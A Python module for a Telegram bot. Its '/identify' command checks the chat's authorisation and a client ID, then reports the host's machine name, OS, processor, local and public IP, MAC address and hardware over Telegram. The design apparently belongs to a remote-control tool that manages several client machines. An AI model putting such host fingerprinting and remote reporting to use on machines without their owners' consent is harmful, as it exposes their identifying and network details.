from telegram.ext import CommandHandler
from telegram.constants import ParseMode

passedCtx = None

def run(ctx):
    global passedCtx
    print(f"[identify module] ctx keys: {list(ctx.keys())}")
    passedCtx = ctx
    ctx["app"].add_handler(CommandHandler("identify", identify))

async def identify(update, context):
    print(f"[identify] Received command from chat_id: {update.effective_chat.id}, username: {update.message.from_user.username}")

    if not passedCtx["auth"].CheckAuth(update.effective_chat.id):
        print(f"Unauthorized access attempt by {update.message.from_user.username}")
        #await update.message.reply_text("⛔ Unauthorized.")
        return

    if not context.args:
        await update.message.reply_text("Usage: /identify <client_id>")
        return
    
    if context.args[0] != passedCtx["info"].ReturnClientID():
        await update.message.reply_text("❌ Invalid client ID.")
        print("Not the same client ID")
        return

    I = passedCtx["info"].GetUniqueIdentifiers()
    client_id = passedCtx["info"].ReturnClientID()

    response = (
        f"🖥️ <b>System Identification</b>\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🔑 <b>Client ID:</b> <code>{client_id}</code>\n\n"
        f"💻 <b>Machine</b>\n"
        f"  ├ Name: <code>{I['MachineName']}</code>\n"
        f"  ├ OS: <code>{I['OS']} {I['OSVersion']}</code>\n"
        f"  ├ Arch: <code>{I['Architecture']}</code>\n"
        f"  └ Processor: <code>{I['Processor']}</code>\n\n"
        f"🌐 <b>Network</b>\n"
        f"  ├ Local IP: <code>{I['LocalIP']}</code>\n"
        f"  ├ Public IP: <code>{I['PublicIP']}</code>\n"
        f"  └ MAC: <code>{I['MACAddress']}</code>\n\n"
        f"⚙️ <b>Hardware</b>\n"
        f"  ├ CPU Cores: <code>{I['CPUCores']}</code>\n"
        f"  ├ RAM: <code>{I['TotalRAMGB']} GB</code>\n"
        f"  └ Disk: <code>{I['DiskTotalGB']} GB</code>"
    )

    await update.message.reply_text(response, parse_mode=ParseMode.HTML)
